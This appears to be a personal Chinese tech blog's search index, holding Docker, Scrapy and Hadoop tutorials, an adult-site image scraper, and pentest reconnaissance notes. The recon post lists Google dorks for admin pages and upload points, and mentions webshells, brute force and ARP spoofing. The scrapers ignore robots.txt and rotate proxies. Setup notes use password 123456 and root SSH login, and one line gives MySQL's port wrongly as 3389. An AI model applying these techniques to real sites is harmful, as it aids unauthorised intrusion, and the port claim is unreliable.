进入容器正在执行的终端\n\n#方法二\ndocker exec -it id bashshell #进入容器后开启新的终端\n```\n\n**从容器拷贝文件到主机**\n```\ndocker cp id:容器内路径 目标主机路径\n```\n\n## 实例-安装nginx\n```\n1.搜索镜像\ndocker search nginx\n\n2.拉取镜像\ndocker pull nginx\n\n3.启动并映射到本地3344端口\ndocker run -d --name nginx01 -p 3344:80 nginx\n\n4.测试\ncurl localhost:3344\n\n5.进入容器\ndocker exec -it nginx01 /bin/bash\n```\n\n## 实例-安装tomcat\n```\n1.拉取镜像\n官方版\ndocker run -it --rm tomcat:9.0 #没有此镜像就会去自动下载,--rm退出后就删除镜像,一般用于测试\n\n1.拉取镜像\ndocker -pull tamcat\n\n2.启动并映射\ndocker run -d -p 3355:8080 --name tomcat01 tomcat\n\n3.测试访问,发现404\ncurl localhost:3355\n\n4.进入容器\ndocker exec -it tomcat01 /bin/bash\n\n5.拷贝\ncp -r webapps.dist/* webapps/\n```\n\n\n## commit镜像\n```shell\ndocker commit 提交容器成为一个新的副本\n\n#与git相似\ndocker commit -m='提交的描述信息' -a='作者' 容器id 目标镜像名:[tag]\n\n#1.利用原来的tomcat制作一个新镜像\ndocker commit -a='chenci' -m='add webapps' id tomcat02:1.0\n\n```\n\n## 容器数据卷\n```shell\n为了容器的持久化和同步操作\n```\n**使用数据卷**\n```shell\n挂载\ndocker run -it -v 主机目录:容器目录\n```\n**测试同步mysql**\n```shell\n#1.启动并映射端口,设置密码\ndocker run -d -p 3310:3306 -v /Users/chenci/guazai/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name some-mysql mysql:5.7\n\n#2.远程连接\nmysql -uroot -p123456 -h 10.30.3.100 -P 3310\n\n#3.在远程连接中创建数据库测试\n测试无误,本地和容器中都会多一个测试数据库\n```\n**具名和匿名挂载**\n```shell\n#只写了容器内的路径,就是匿名挂载\ndocker run -it -P --name nginx -V /path id\n#查看\nlocal     6c71f963cc89b24d16b4b47cb35df42445ff9d9395753b192ba72cbbbc22d583\n\n\n#写了名字就是具名挂载\ndocker run -it -P --name nginx -V juming /path id\n#查看\nlocal     juming\n\n\n#查看所有的volume\ndocker volume ls\n\n#查看卷\ndocker volume inspect juming\n\n```\n**`通过具名可以方便找到一个卷通所以一般使用具名挂载`**\n```shell\n-v 容器内路径 #匿名挂载\n-v 卷名:容器内路径 #匿名挂载\n```\n**`扩展`**\n```shell\n#在路径后面跟:ro或则rw\nro表示这个路径只能通过宿主机来操作,容器内部无法操作\n```\n\n","tags":["教程","docker"],"categories":["工具使用"]},{"title":"信息收集","url":"/2022/04/17/信息收集/","content":"\n# 信息收集流程框架\n    web安全的本质是信息收集,信息收集的广度决定了渗透测试的深度\n\n![1](img.png)\n\n# google hacking\n利用谷歌强大的搜索引擎,经常会有意想不到的的收获\n\n## 基本的搜索\n- 逻辑与 and\n- 逻辑或 or\n- 逻辑非 \n- 通配符 *\n\n## 应用\nintext寻找网页正文中的关键字,如: intext后台登录\n\n![intext后台登录](img_1.png)\n\nintitle寻找网页标题中的关键字,如: intitle\n\n![intitle](img_2.png)\n\nallintitle用法和intitle差不多,差别在于可指定多个关键字\ninurl返回url中含有关键字的网页,如: inurl:login\n\n![inurl:login](img_3.png)\n\n查找管理员登录界面\n\n![管理员登录界面](img_4.png)\n\n\n查找phpmyadmin\n\n![phpmyadmin](img_5.png)\n\nallinurl和inurl的用法差不多,差别在于可指定多个关键字\nsite指定访问的网站,如,site:baidu.com inurl:login\n\n![allinurl](img_6.png)\n\n## 查找网站后台\n\n- site:xx.com intext:管理\n- site:xx.com inurl:login\n- site:xx.com intitle:后台\n\n## 查看服务器使用的程序\n\n- site:xx.com filetype:asp\n- site:xx.com filetype:php\n- site:xx.com filetype:jsp\n- site:xx.com filetype:aspx\n\n## 查看上传漏洞\n- site:xx.com inurl:file\n- site:xx.com inurl:load\n\n# dns域名信息\n首先是对应域名的ip,域名注册人,邮箱,dns,子域名之类的信息\n\n![allinurl](img_7.png)\n\n## whois查询\n- 然后判断是否有cdn\thttp://cdn.chinaz.com\n- 也可以使用不同地区的电脑ping,看ip是否是同一个\n- 如果查询出的ip有多个就说明使用了cdn\n\n## CDN查询\n- 绕过cdn查询真实ip https://x.threatbook.cn/ 微步\n\n# 整站分析\n服务器类型\n- 服务器平台,版本等\n网站容器\n- 搭建网站的服务组件,如:iis,apache,nginx等等\n脚本类型\n- 常见的有asp,php,jsp,aspx\n数据库类型\n- 常见的有access,sqlserver,mysql,oracle\ncms类型\n- 网站模板\nwaf\n- 安全防护软件\n\n## 服务器类型(windows/linux)\n- nmap 扫描\n- google抓包分析\n\n## 网站容器(iis,apache,nginx)\n知道网站容器很重要,如iis6.0的解析漏洞,ngixn<0.83的解析漏洞.,iis7.0的畸形解析漏洞等等\n- nmap 扫描\n- google抓包分析\n\n## 脚本类型(php,jsp,asp,aspx等)\n- 根据网站的url\n- 直接打开一个展示页面查看\n- 根据firefox的插件查看\n\n## 数据库类型\n- mysql端口为3389,数据库后缀名.sql\n- sqlserver端口为1433,数据库后缀名.mdf\n- access后缀名为.mdb\n- oraacle,端口为1521\n\n一般的常见搭配为\n\n- ASP和ASPX:access,sqlserver\n- PHP:mysql\n- JSP:oracle,mysql\n\n## 端口扫描\n扫描目标开放了哪些端口,如常见的135,137,445经常爆发出漏洞\n- 21,22,23,3389\tftp,ssh,telnet,windows远程桌面\n- 873 rsync 未授权访问漏洞\n- 3306 mysql 弱口令\n- 6379 redis未授权访问漏洞\n\n## 网站敏感目录和文件\n- 后台目录:万能密码,弱口令,爆破\n- 安装包:获取数据库信息,甚至是网站源码\n- 上传目录:上传木马,一句话等\n- mysql管理接口:爆破,弱口令,万能密码,甚至能直接拿shell\n- phpinfo:暴露各种配置信息\n- 编辑器:各种畸形漏洞\n- robots.txt\n\n## 旁站和C段\n- 旁站指的是同一服务器上得不同网站,如果你拿不下这个网站,不如试试旁站.拿下旁站webshell,再提权也就拿下了这个网站了\n\n- C段指的是同一网段的其他服务器,192.168.0.1,0就是C段.如果拿下了C段中一台服务器,就可使用嗅探工具,arp欺骗等劫持流量,找到关键信息,拿下服务器\n\n- 旁站查询:http://s.tool.chinaz.com/same\n\n- C段查询:http://www.webscan.cc/\n\n","tags":["web安全","信息收集"],"categories":["笔记"]},{"title":"异步协程爬取福利姬","url":"/2022/04/14/异步爬取某涩情网站图片/","content":"\n\n```python\n# -*- coding: utf-8 -*-\n\"\"\"\n-------------------------------------------------\n   File Name：     协程4-实战爬取tuao8.com\n   Author :       chenci\n   date：          2022/3/25\n-------------------------------------------------\n\"\"\"\nimport aiofiles\nimport requests\nfrom lxml import etree\nimport asyncio\nimport aiohttp\nfrom fake_useragent import UserAgent\nimport os\nimport time\n\ndef create_dir_not_exist(path):\n    if not os.path.exists(path):\n        os.makedirs(path)\n\n\n# 抓取每个条目的图集\ndef get_photos_url():\n    resp = requests.get(url='https://www.tuao8.xyz/category-2_1.html', headers=header)\n    text = etree.HTML(resp.text)\n    href_url_list = text.xpath('//*[@id=\"container\"]/main/article/div/a/@href')\n    return href_url_list\n\n\n# 去请求每个图集.返回源码\nasync def get_photos(photo_list):\n    # 限制并发熟路默认100,0为无限制\n    conn = aiohttp.TCPConnector(limit=10)\n    # 发送请求\n    async with aiohttp.ClientSession(connector=conn) as session:\n        async with await session.get(url=photo_list, headers=header) as resp:\n            page_text = await resp.text()\n            await get_photos_title_page(page_text, photo_list)\n\n\n# 从每个源码里筛选出标题和最大页码,url\nasync def get_photos_title_page(text, url):\n    tasks = []\n    html = etree.HTML(text)\n    title = html.xpath('//*[@id=\"container\"]/main/article/h1/text()')[0]\n    max_page = int(html.xpath('//*[@id=\"dm-fy\"]/li[last()-1]/a/text()')[0])\n    create_dir_not_exist(f'./imgs/tuzo_xc/{title}')\n    task = asyncio.create_task(get_download_url(url=url, title=title, max_page=max_page))\n    tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# 获取每一页的url并从源码中筛选出每张图片的下载链接\nasync def get_download_url(url, title, max_page):\n    tasks = []\n    for i in range(1, max_page):\n        urls = f'{url}?page={i}'\n        conn = aiohttp.TCPConnector(limit=10)\n        async with aiohttp.ClientSession(connector=conn) as session:\n            async with await session.get(url=urls, headers=header) as resp:\n                page_text = await resp.text()\n                html = etree.HTML(page_text)\n                image_url = html.xpath('//*[@class=\"entry\"]//img/@src')[0]\n                task = asyncio.create_task(download_image(image_url, title, i))\n                tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# 下载\nasync def download_image(image_url, title, i):\n    conn = aiohttp.TCPConnector(limit=30)\n    async with aiohttp.ClientSession(connector=conn) as session:\n        try:\n            async with await session.get(url=image_url, headers=header) as resp:\n                print(image_url)\n                async with aiofiles.open(f'./imgs/{title}/{i}.jpg', 'wb') as f:\n                    print(f'正在下载{title}  第{i}张')\n                    await f.write(await resp.read())\n        except:\n            pass\n        print('下载完成')\n\n\nasync def main():\n    href_url_list = get_photos_url()\n    tasks = []\n    for url in href_url_list:\n        task = asyncio.create_task(get_photos(photo_list=url))\n        tasks.append(task)\n    await asyncio.wait(tasks)\n\n\nif __name__ == '__main__':\n    start = time.time()\n    ua = UserAgent()\n    header = {\n        'Referer': 'https://www.tuao8.xyz/category-2_2.html',\n        'user-agent': ua.random\n    }\n    asyncio.run(main())\n    end = time.time()\n    print('全部下载完成!耗时:', int(end - start), '秒')\n\n\n```\n![1](img.png)\n","tags":["requests","异步"],"categories":["爬虫"]},{"title":"scrapy框架学习","url":"/2022/04/08/scrapy框架学习/","content":"\n## 创建项目\n\n```bash\nscrapy startproject tutorial\n```\n\n## 创建任务\n\n```bash\nscrapy genspider first www.baidu.com\n```\n\n会生成一个first文件\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    # 唯一标识符\n    name = 'first'\n    # 允许的域名\n    allowed_domains = ['www.baidu.com']\n    # 起始的url,默认发送get请求\n    start_urls = ['https://www.baidu.com/']\n\n    # 数据解析\n    def parse(self, response):\n        pass\n```\n\n## 修改配置文件\n\n只输出ERROR级别的日志\n\n```python\n# 只输出ERROR级别的日志\nLOG_LEVEL = 'ERROR'\n```\n\n不遵从robots协议\n\n```python\nROBOTSTXT_OBEY = False  \n```\n\n指定ua\n\n```python\nUSER_AGENT = 'tutorial (+http://www.yourdomain.com)'\n```\n\n## 运行程序\n\n```bash\nscrapy crawl first\n```\n\n会输出一个response对象\n\n```\n<200 https://www.baidu.com/>\n```\n\n## 数据解析\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            print(title)\n\n```\n\n可以看到返回了一个selector对象,我们想要的数据在data属性里\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='如果你得罪了老板，失去的只是一份工作；如果你得罪了客户，失去的不过是一份订...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='有位非常漂亮的女同事，有天起晚了没有时间化妆便急忙冲到公司。结果那天她被记...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='悟空和唐僧一起上某卫视非诚勿扰,悟空上台,24盏灯全灭。理由:1.没房没车...'>\n```\n\n从data属性中取出我们想要的数据\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n            print(title)\n\n```\n\n## 持久化存储\n\n### 1.基于终端指令的存储\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        data_all = []\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n            # 构造字典\n            dic = {\n                'title': title\n            }\n            data_all.append(dic)\n        # 返回一个列表\n        return data_all\n```\n\n执行\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first -o test.csv\n```\n\n### 2.基于管道的持久化存储\n\n开启管道\n\nsettings.py\n\n```python\nITEM_PIPELINES = {\n    'tutorial.pipelines.TutorialPipeline': 300,  # 300表示优先级,越小优先级越高\n}\n```\n\n在items.py中定义相关属性\n\n```python\nimport scrapy\n\n\nclass TutorialItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    # Field定义好的属性当做万能属性\n    title = scrapy.Field()\n\n```\n\n将first.py提取出的数据提交给管道\n\n```python\nimport scrapy\nfrom tutorial.items import TutorialItem\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n\n            # 实例化一个item对象,将解析到的数据存入到该对象\n            item = TutorialItem()\n            # 通过字典的方式调用\n            item['title'] = title\n            # 将item对象提交给管道\n            yield item\n\n```\n\n在pipelines.py中重写父类方法,存储到本地\n\n```python\nclass TutorialPipeline:\n    # 重写父类方法\n    f = None\n\n    def open_spider(self, spider):\n        print('我是open_spider,只会在爬虫开始的时候执行一次')\n        self.f = open('./text1.txt', 'w', encoding='utf-8')\n\n    def close_spider(self, spider):\n        print('我是close_spider,只会在爬虫开始的时候执行一次')\n        self.f.close()\n\n    # 该方法是用来接收item对象的,一次只能接收一个item,说明该方法会被多次调用\n    # 参数item就是接收的item对象\n    def process_item(self, item, spider):\n        # 存储到本地文件\n        self.f.write(item['title'] + '\\n')\n        return item\n```\n\n基于管道实现数据的备份\n\npipelines.py\n\n```python\nimport pymysql\n\n\nclass MysqlPipeline(object):\n    conn = None\n    cursor = None\n\n    # 重写父类\n    def open_spider(self, spider):\n        # 数据库连接对象\n        self.conn = pymysql.Connect(host='localhost', port=3306, user='root', password='123456', charset='utf8',\n                                    db='spider')\n\n    def process_item(self, item, spider):\n        self.cursor = self.conn.cursor()\n        sql = 'insert into duanzi values(\"%s\")' % item['title']\n        # 事务处理\n        try:\n            self.cursor.execute(sql)\n            self.conn.commit()\n        except Exception as e:\n            print(e)\n            self.conn.rollback()\n        # 返回item会给下一个管道使用,如果不返回,下一个管道将接收不到\n        return item\n\n    # 重写父类,关闭连接\n    def close_spider(self, spider):\n        self.cursor.close()\n        self.conn.close()\n\n```\n\n在settings.py增加一个管道\n\n```python\nITEM_PIPELINES = {\n    # 爬虫文件中的item只会提交给优先级最高的那一个管道类\n    'tutorial.pipelines.TutorialPipeline': 300,\n    'tutorial.pipelines.MysqlPipeline': 301,\n}\n```\n\n## 手动请求发送\n\n新建工程\n\n```bash\nchenci@MacBook-Pro scrapy %scrapy startproject HandReq\nchenci@MacBook-Pro scrapy %cd HandReq \nchenci@MacBook-Pro HandReq %scrapy genspider duanzi www.xxx.com\n```\n\n```python\nimport scrapy\nfrom HandReq.items import HandreqItem\n\n\nclass DuanziSpider(scrapy.Spider):\n    name = 'duanzi'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://duanzixing.com/page/1/']\n\n    # 通用的url模板\n    url = 'https://duanzixing.com/page/%d/'\n    page_num = 2\n\n    def parse(self, response):\n        title_list = response.xpath('/html/body/section/div/div/article[1]/header/h2/a/text()')\n        for title in title_list:\n            title = title.extract()\n            item = HandreqItem()\n            item['title'] = title\n            yield item\n\n        if self.page_num < 5:\n            # 构造页码\n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # 对新的url发起请求,递归回调自己\n            yield scrapy.Request(url=new_url, callback=self.parse)\n            # scrapy.FormRequest(url,callback,formdata) 发送post请求\n\n```\n\n## 五大核心组件工作流程\n\n![1](img.png)\n\n引擎(Scrapy)\n\n    用来处理整个系统的数据流处理, 触发事务(框架核心)\n\n调度器(Scheduler)\n\n    用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址\n\n下载器(Downloader)\n\n    用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)\n\n爬虫(Spiders)\n\n    爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面\n\n项目管道(Pipeline)\n\n    负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。\n\n## 请求传参的深度爬取-4567kan.com\n\n文件目录\n\n![1](img_1.png)\n\n    meta是一个字典,可以将meta传给callback\n        scrapy.Request(url, callback, meta)\n\n    callback取出字典\n        item = response.meta['item']\n\nmove.py 项目文件\n\n```python\nimport scrapy\nfrom move_4567kan.items import Move4567KanItem\n\n\nclass MoveSpider(scrapy.Spider):\n    name = 'move'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.4567kan.com/frim/index1-1.html']\n\n    # 构造页码\n    url = 'https://www.4567kan.com/frim/index1-%d.html'\n    page_num = 2\n\n    def parse(self, response):\n        # 抓取url和title\n        li_list = response.xpath('/html/body/div[2]/div/div[3]/div/div[2]/ul/li')\n        for li in li_list:\n            url = 'https://www.4567kan.com' + li.xpath('./div/a/@href').extract()[0]\n            title = li.xpath('./div/a/@title').extract()[0]\n\n            # 传递给item\n            item = Move4567KanItem()\n            item['title'] = title\n\n            # 对详情页发起请求,回调get_details函数\n            # meta请求传参,以字典形式,传给get_details函数,因为item只能是唯一\n            yield scrapy.Request(url=url, callback=self.get_details, meta={'item': item})\n\n        # 爬取多页\n        if self.page_num < 5:\n            # 构造页码\n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # 对新的url发起请求,递归回调自己\n            yield scrapy.Request(url=new_url, callback=self.parse)\n\n    # 自定义函数去抓取详情\n    def get_details(self, response):\n        details = response.xpath('//*[@class=\"detail-content\"]/text()').extract()\n        # 判断,没有返回None\n        if details:\n            details = details[0]\n        else:\n            details = None\n        # 接受item\n        item = response.meta['item']\n        item['details'] = details\n        # 提交给管道\n        yield item\n\n```\n\nitems.py 定义两个字段\n\n```python\nimport scrapy\n\n\nclass Move4567KanItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    details = scrapy.Field()\n\n```\n\npipelines.py 打印输出\n\n```python\nclass Move4567KanPipeline:\n    def process_item(self, item, spider):\n        print(item)\n        return item\n\n```\n\n## 中间件\n\n作用\n\n    拦截请求和响应\n\n爬虫中间件\n\n    略\n\n下载中间件(推荐)\n\n    拦截请求:    \n        1.篡改请求url\n        2.伪装请求头信息:\n            UA\n            Cookie\n        3.设置请求代理\n\n    拦截响应:\n        篡改响应数据\n\n改写中间件文件 middlewares.py\n\n```python\n\nfrom scrapy import signals\nfrom itemadapter import is_item, ItemAdapter\n\n\nclass MiddleDownloaderMiddleware:\n\n    # 拦截所有请求\n    # request就是拦截到的请求,spider就是爬虫类实例化的对象\n    def process_request(self, request, spider):\n        print('我是process_request()')\n        return None\n\n    # 拦截所有响应对象\n    # request就是response响应对象对应的请求对象,response就是拦截到的响应对象\n    def process_response(self, request, response, spider):\n        print('我是process_response()')\n        return response\n\n    # 拦截异常请求\n    # request就是拦截到的异常请求的请求对象\n    # 作用:修正异常请求,将其 重新发送\n    def process_exception(self, request, exception, spider):\n        print('我是process_exception()')\n        # pass\n```\n\n编写爬虫文件\n\n```python\nimport scrapy\n\n\nclass MidSpider(scrapy.Spider):\n    name = 'mid'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.baidu.com', 'https://www.sogou.com']\n\n    def parse(self, response):\n        print(response)\n\n```\n\n在配置文件setting.py中启用\n\n```python\nROBOTSTXT_OBEY = True\n\nDOWNLOADER_MIDDLEWARES = {\n    'middle.middlewares.MiddleDownloaderMiddleware': 543,\n}\n```\n\n启动工程\n\n```bash\nchenci@MacBook-Pro middle %scrapy crawl mid\n我是process_request()\n我是process_request()\n我是process_response()\n我是process_exception()\n我是process_response()\n我是process_exception()\n```\n\nprocess_exception()方法设置代理\n\n```python\n# 拦截异常请求\n# request就是拦截到的异常请求的请求对象\n# 作用:修正异常请求,将其 重新发送\ndef process_exception(self, request, exception, spider):\n    # 请求的ip被禁,该请求就会变成一个异常请求,加入代理\n    request.meta['proxy_'] = 'https://ip:port'\n    print('我是process_exception()')\n    # 将异常的请求修正后重新发送\n    return request\n    # 可能会造成死循环,因为如果加入代理后依旧发生异常,会再次加入代理去请求\n```\n\nprocess_request()方法设置headers\n\n```python\ndef process_request(self, request, spider):\n    # 设置请求头,但一般不这么写,可以在setting.py中设置全局\n    request.headers['User-Agent'] = 'xxx'\n    request.headers['Cookie'] = 'xxx'\n    print('我是process_request()')\n    return None\n```\n\nprocess_response()方法篡改响应数据\n\n```python\n# 拦截所有响应对象\n# request就是response响应对象对应的请求对象,response就是拦截到的响应对象\ndef process_response(self, request, response, spider):\n    # 篡改响应数据\n    response.text = 'xxx'\n    print('我是process_response()')\n    return response\n```\n\n## 大文件下载-爬取jdlingyu.com图片\n\n文件目录\n\n![1](img_2.png)\n\nimg.py\n\n```python\nimport scrapy\nfrom imgdownload.items import ImgdownloadItem\n\n\nclass ImgSpider(scrapy.Spider):\n    name = 'img'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.jdlingyu.com']\n\n    def parse(self, response):\n        li_list = response.xpath('/html/body/div[1]/div[2]/div[1]/div/div[6]/div/div[1]/div/div[2]/ul/li')\n        for a in li_list:\n            url = a.xpath('./div/div[2]/h2/a/@href').extract()[0]\n            title = a.xpath('./div/div[2]/h2/a/text()').extract()[0]\n\n            # 传递给itme\n            item = ImgdownloadItem()\n            item['title'] = title\n\n            # 回调并传递参数\n            yield scrapy.Request(url=url, callback=self.get_img_url, meta={'item': item})\n\n    # 对每个图集的url发起请求\n    def get_img_url(self, response):\n        page = 0\n        item = response.meta['item']\n        # 抓取每张图片的下载链接\n        img_list = response.xpath('//*[@id=\"primary-home\"]/article/div[2]/img')\n        for scr in img_list:\n            img_url = scr.xpath('./@src').extract()[0]\n            page += 1\n            # 传递给item\n            item['img_url'] = img_url\n            item['page'] = page\n            # 提交给管道\n            yield item\n\n```\n\nsetting.py增加配置\n\n```python\nUSER_AGENT = 'ua'\nROBOTSTXT_OBEY = False\nLOG_LEVEL = 'ERROR'\n# 图片存放目录\nIMAGES_STORE = './imgs'\n\n```\n\nitems.py增加字段\n\n```python\nimport scrapy\n\n\nclass ImgdownloadItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    img_url = scrapy.Field()\n    page = scrapy.Field()\n```\n\npipelines.py增加管道类\n```python\nimport scrapy\nfrom itemadapter import ItemAdapter\n\n# 默认管道类无法请求图片数据\nclass ImgdownloadPipeline:\n    def process_item(self, item, spider):\n        return item\n\n\n# 接受图片地址和title,然后对其进行请求存储到本地\n# 提供了数据下载功能,也可以下载视频和音频\nfrom scrapy.pipelines.images import ImagesPipeline\n\n\n# 继承ImagesPipeline类\nclass img_download(ImagesPipeline):\n    # 重写三个父类方法\n    def get_media_requests(self, item, info):\n        # 下载,并传参,如果传递整个item,最后只会下载一张图片,原因未知\n        yield scrapy.Request(url=item['img_url'], meta={'title': item['title'], 'page': item['page']})\n\n    # 返回图片保存路径\n    def file_path(self, request, response=None, info=None, *, item=None):\n        # 拼接路径\n        title = request.meta['title']\n        page = request.meta['page']\n        path = f'{title}/{page}.jpg'\n\n        # 返回路径\n        return path\n\n    # 将item返回给下一个即将被执行的管道类\n    def item_completed(self, results, item, info):\n        return item\n```\n\nsetting.py增加管道类\n```python\nITEM_PIPELINES = {\n   #'imgdownload.pipelines.ImgdownloadPipeline': 300,\n   'imgdownload.pipelines.img_download': 300,\n}\n```\n\n运行效果\n\n![1](img_3.png)\n\n## CrawlSpider 深度爬取\n是什么\n\n    是Spider的一个子类,也就是爬虫文件的父类\n    \n作用:用作于全站数据的爬取\n    \n    将一个页面下所有的页码进行爬取\n\n基本使用\n    \n    1.创建一个工程\n    2.创建一个基于CrawlSpider类的爬虫文件\n        crapy genspider -t crawl main www.xxx.com\n    3.执行工程\n\n编写工程文件main.py\n```python\nimport scrapy\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\n\n\nclass MainSpider(CrawlSpider):\n    name = 'main'\n    #allowed_domains = ['https://www.mn52.com/']\n    start_urls = ['https://www.mn52.com/fj/']\n\n    # 链接提取器,根据allow里的正则来提取url\n    rules = (\n        # 对提取的url发起请求,然后回调解析\n        # 如果allow为空 将抓取此页面下的链接\n        Rule(LinkExtractor(allow=r'list_8_\\d.html'), callback='parse_item', follow=True),\n    )\n\n    def parse_item(self, response):\n        print(response)\n        item = {}\n        return item\n\n```\n执行工程\n    \n    可以看到抓取了所有页码的url\n```bash\nchenci@MacBook-Pro crawl %scrapy crawl main\n<200 https://www.mn52.com/fj/list_8_2.html>\n<200 https://www.mn52.com/fj/list_8_3.html>\n<200 https://www.mn52.com/fj/list_8_4.html>\n<200 https://www.mn52.com/fj/list_8_8.html>\n<200 https://www.mn52.com/fj/list_8_5.html>\n<200 https://www.mn52.com/fj/list_8_7.html>\n<200 https://www.mn52.com/fj/list_8_9.html>\n<200 https://www.mn52.com/fj/list_8_6.html>\n```\n\n\n","tags":["教程","爬虫","scrapy"],"categories":["爬虫"]},{"title":"ubuntu下大数据集群搭建","url":"/2022/03/01/ubuntu下hadoop集群搭建/","content":"### 一.配置ip(三个节点)\n自ubuntu17之后多了一种配置方式更加高效,也就是netplan\n\n1.1编辑配置文件\n```bash\nroot@master:/etc/netplan# gedit /etc/netplan/01-network-manager-all.yaml\n```\n配置内容如下,`注意缩进`\n```yaml\nnetwork:\n version: 2\n renderer: NetworkManager\n ethernets:\n    ens33:\n      dhcp4: no\n      dhcp6: no\n      addresses: [192.168.10.101/24]\n      gateway4: 192.168.10.1\n      nameservers:\n        addresses: [8.8.8.8, 192.168.10.1]\n```\n1.2使配置生效\n```bash\nroot@master:/etc/netplan# netplan apply\n```\n如果没有报错则配置成功\n\n### 二.配置主机名和主机名映射(三个节点)\n1.1配置主机名并查看\n```bash\n重启后生效\nroot@master:/etc/netplan# hostnamectl set-hostname master\nroot@master:/etc/netplan# hostname\n```\n1.2配置主机名映射\n```bash\nroot@master:/etc/netplan# gedit /etc/hosts\n```\n添加以下内容\n```bash\n192.168.10.101 master\n192.168.10.102 slave1\n192.168.10.103 slave2\n```\n1.3ping测试\n```bash\n有以下回显证明配置成功\nroot@master:/etc/netplan# ping slave2\nPING slave2 (192.168.10.103) 56(84) bytes of data.\n64 bytes from slave2 (192.168.10.103): icmp_seq=1 ttl=64 time=0.891 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=2 ttl=64 time=0.369 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=3 ttl=64 time=0.455 ms\n```\n1.4将hosts文件分发给子节点\n```bash\nroot@master:/etc/netplan# scp /etc/hosts root@slave1:/etc/\n输入yes再输入密码\n```\n\n### 三.配置ssh免密登录(三个节点)\n因为Ubuntu并不自带ssh服务所以要安装ssh并配置允许root远程登录\n```bash\n下载\nsudo apt-get install openssh-server\n启动\nsudo service ssh start\n配置\nsudo vim /etc/ssh/sshd_config\n添加一条\nPermitRootLogin yes\n```\n1.生成密钥\n```bash\nroot@master:~# ssh-keygen -t rsa\n一直回车\n```\n2.将密钥写入authorized.keys文件\n```bash\nroot@master:~# cd .ssh/\nroot@master:~/.ssh# cat id_rsa.pub >> authorized_keys\n\n```\n3.在另外两个子节点执行以上操作,并将authorized.keys的内容复制进master主机的authorized.keys文件末尾,成功后如下\n```bash\nroot@master:~/.ssh# cat authorized.keys \nssh-dss AAAAB3NzaC1kc3MAAACBAIzJrAXCuK15C+mq3TkdFFJUJiuY9rMo6L6LoU+naCEKJNKfRDXXAXDcRC2TJK5JqnWHuexfOusYZS/kpRU4JO1S4VGzq446r5QM19c7xH3TkE2A2W2Z9AA/7G+UHzqyHWQ6gDRIsqqsF6MlJUtOO7x3XtNUVYrtIzvUeqTbXrbJAAAAFQCsjTDCWxn2PU5WobBN/xYTxS9vdwAAAIBcM2X2tlkwnmpNcm3a1Cf4addU395AfJfhOwdqacHSCdiaNSlx7kVkd8T1Hk+gvF0KzP4KbjqiGWsGEiaYdlU4Ujrei+VplG8moa4GcCA/wUzpAioeULCP+0+870/+NwFUt7XKhYk9llUrh56LWev5c5YC3aNQ0GzElBxjUj8v4gAAAIBpUWTTkmdeL7ploxSCR56Js0pMFJiGvKP6tMkc3UL5Vwl5RDqJt+eFd31SDVJVVEK3vX06wujOlDbHwdIfpE48y2dN7nRn5bK3ccg1yo7Cq7Vtj4TlODYTkPYxXaR2e8dqW9bg8anXvaCI7AylRwPYNnQIgcjPeC4qJsRuMq4Mag== root@master\nssh-dss 